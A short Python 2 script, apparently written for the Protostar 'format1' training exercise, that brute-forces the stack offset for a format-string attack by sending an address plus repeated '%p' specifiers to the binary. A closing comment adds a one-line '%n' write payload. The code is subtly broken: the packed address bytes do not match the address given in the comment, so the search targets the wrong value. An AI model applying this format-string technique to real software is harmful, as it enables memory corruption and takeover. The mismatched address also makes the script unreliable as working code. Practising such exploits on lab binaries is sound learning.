#!/usr/bin/env python2

import struct
import subprocess
import os

pathToBinary = '/opt/protostar/bin/format1'
# targetAddrs = 0x08049638
targetAddrsStr = '\x38\x96\x40\x08' # struct.pack("I", targetAddrs)

payloadLimit = None # Defaults to 512

for tryBufferSize in range(1, payloadLimit if payloadLimit > 0 else 512):
    os.system('clear')
    print 'Target is : ' + targetAddrsStr
    payload = targetAddrsStr + '%p' * tryBufferSize
    print 'Payload lenght: ' + str(tryBufferSize)
    process = subprocess.Popen([pathToBinary, payload], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, err = process.communicate()
    
    found = str(output).find(targetAddrsStr) != -1
    if found is True:
        print '[!] TARGET ' + targetAddrsStr + ' FOUND [!]'
        print 'Payload : ' + str(payload)
        print 'Output : ' + str(output)
        break
    else:
        print 'Target not found in output for try' + str(tryBufferSize)

# Some tries:
# ./format1 `python -c "print '\x38\x96\x40\x08' + 'AAAA' + '%08x'*135 + '%08x' + '%n'"`
